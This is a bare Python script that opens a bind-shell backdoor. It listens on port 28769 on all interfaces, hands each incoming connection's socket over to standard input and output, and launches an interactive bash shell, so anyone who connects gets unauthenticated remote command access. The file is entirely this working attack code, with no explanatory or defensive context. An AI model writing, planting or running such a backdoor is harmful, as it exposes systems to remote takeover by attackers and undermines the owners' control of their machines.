import socket,os,subprocess

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(("0.0.0.0",28769))
s.listen(5)
while True:
  c,a=s.accept()
  os.dup2(c.fileno(),0)
  os.dup2(c.fileno(),1)
  os.dup2(c.fileno(),2)
  p=subprocess.call(["/bin/bash","-i"])
